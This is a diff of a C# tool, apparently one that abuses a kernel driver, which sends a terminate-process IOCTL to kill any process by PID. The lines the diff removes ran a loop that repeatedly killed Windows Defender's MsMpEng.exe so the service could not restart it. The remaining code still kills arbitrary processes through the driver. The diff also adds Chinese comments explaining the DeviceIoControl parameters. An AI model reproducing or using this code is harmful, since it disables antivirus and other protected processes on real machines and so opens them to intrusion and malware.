@@ -89,62 +89,29 @@ class Program
 
         Console.WriteLine($"Driver initialized {INITIALIZE_IOCTL_CODE:X} !!");
 
-        if (GetProcessIdByName("MsMpEng.exe") == input)
+        
+        Console.WriteLine("Terminating process !!");
+
+        // 发送IO终止符号
+        result = NativeMethods.DeviceIoControl(
+            hDevice,
+            TERMINATE_PROCESS_IOCTL_CODE,
+            ref input, // 输入PID
+            sizeof(uint),
+            IntPtr.Zero,
+            0,
+            out bytesReturned,
+            IntPtr.Zero);
+
+        if (!result)
         {
-            Console.WriteLine("Terminating Windows Defender..");
-            Console.WriteLine("Keep the program running to prevent the service from restarting it");
-            bool once = true;
-            while (true)
-            {
-                if (input == GetProcessIdByName("MsMpEng.exe"))
-                {
-                    if (!NativeMethods.DeviceIoControl(
-                        hDevice,
-                        TERMINATE_PROCESS_IOCTL_CODE,
-                        ref input,
-                        sizeof(uint),
-                        IntPtr.Zero,
-                        0,
-                        out bytesReturned,
-                        IntPtr.Zero))
-                    {
-                        Console.WriteLine($"DeviceIoControl failed. Error: {Marshal.GetLastWin32Error():X} !!");
-                        NativeMethods.CloseHandle(hDevice);
-                        return;
-                    }
-                    if (once)
-                    {
-                        Console.WriteLine("Defender Terminated..");
-                        once = false;
-                    }
-                }
-
-                Thread.Sleep(700);
-            }
+            Console.WriteLine($"Failed to terminate process: {Marshal.GetLastWin32Error():X} !!");
+            NativeMethods.CloseHandle(hDevice);
+            return;
         }
-        else
-        {
-            Console.WriteLine("Terminating process !!");
 
-            result = NativeMethods.DeviceIoControl(
-                hDevice,
-                TERMINATE_PROCESS_IOCTL_CODE,
-                ref input,
-                sizeof(uint),
-                IntPtr.Zero,
-                0,
-                out bytesReturned,
-                IntPtr.Zero);
-
-            if (!result)
-            {
-                Console.WriteLine($"Failed to terminate process: {Marshal.GetLastWin32Error():X} !!");
-                NativeMethods.CloseHandle(hDevice);
-                return;
-            }
-
-            Console.WriteLine("Process has been terminated!");
-        }
+        Console.WriteLine("Process has been terminated!");
+        
 
         NativeMethods.CloseHandle(hDevice);
     }
@@ -207,14 +174,14 @@ class Program
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern bool DeviceIoControl(
-            IntPtr hDevice,
-            uint dwIoControlCode,
-            ref uint lpInBuffer,
-            int nInBufferSize,
-            IntPtr lpOutBuffer,
-            int nOutBufferSize,
-            out int lpBytesReturned,
-            IntPtr lpOverlapped);
+            IntPtr hDevice,  // 需要控制的设备的句柄
+            uint dwIoControlCode,  // 控制代码
+            ref uint lpInBuffer,  // 输入缓冲区的指针
+            int nInBufferSize,  // 输入缓冲区的大小
+            IntPtr lpOutBuffer,  // 输出缓冲区的指针
+            int nOutBufferSize,  // 输出缓冲区的大小
+            out int lpBytesReturned,  // 返回的字节个数
+            IntPtr lpOverlapped);  // OVERLAPPED结构的指针, 大多数情况为NULL
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr CreateToolhelp32Snapshot(
